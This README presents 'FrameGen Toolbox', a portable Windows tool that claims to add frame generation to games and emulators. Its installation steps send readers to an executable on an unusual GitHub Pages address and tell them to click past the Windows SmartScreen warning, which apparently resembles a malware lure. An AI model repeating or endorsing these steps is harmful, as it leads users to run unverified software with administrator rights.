# FrameGen Toolbox — Universal Frame Generation for Games & Emulators

![Banner](https://images.unsplash.com/photo-1542751371-adc38448a05e?w=1200&h=400&fit=crop)

**FrameGen Toolbox** is a portable utility designed to bring modern frame generation (LSFG 3.1+, FSR Frame Generation and hybrid modes) to almost any game and popular emulators with a single click.

It automatically scans Steam, Epic Games, GOG and Xbox libraries, detects the graphics API used by each title, creates secure backups of original files, and allows full restoration at any time.

---

## Supported Graphics APIs

- DirectX 9 / 10 / 11 / 12  
- Vulkan  
- OpenGL  

Games without native frame generation support can use the experimental **Feeder mode**.

---

## Emulator Support

Full support for:

- DuckStation  
- PCSX2  
- Dolphin  
- PPSSPP  
- Xenia  
- Cemu  
- RPCS3  
- Ryujinx  
- shadPS4  
- RetroArch  
- Flycast  
- Vita3K  
and many others.

The tool automatically detects supported executables and applies the correct installation method.

---

## Key Features

- Automatic scanning of Steam, Epic Games, GOG and Xbox libraries  
- Manual addition of custom game folders  
- Detection of main executable and graphics API  
- One-click installation of frame generation  
- Experimental Feeder mode for unsupported titles  
- Compatible with both 32-bit and 64-bit applications  
- Automatic backups before any modification  
- One-click **Restore Originals**  
- Fully portable — no installation required  
- Multi-language interface

---

## System Requirements

- **Operating System:** Windows 10 or Windows 11 (64-bit)  
- **GPU:** Any modern NVIDIA / AMD / Intel graphics card  
- **Storage:** Small amount of free space for the portable tool and backups  
- **Permissions:** Administrator rights may be required  
- **Internet:** Required only for downloading the latest components  

> Note: Compatibility may vary depending on the specific game, emulator and graphics API.

---

## Installation

1. Download the latest version of **FrameGen Toolbox** from:  
   **[https://dlss-5.github.io/.github/](https://dlss-5.github.io/.github/)**

2. Extract the archive and launch the executable.

3. If Windows SmartScreen appears, click **More info** → **Run anyway**.

4. The tool will automatically scan your game libraries.

5. Select a game (or add a custom folder) and choose the desired mode.

6. Click **Install Frame Generation**.

7. Launch the game and enjoy higher frame rates.
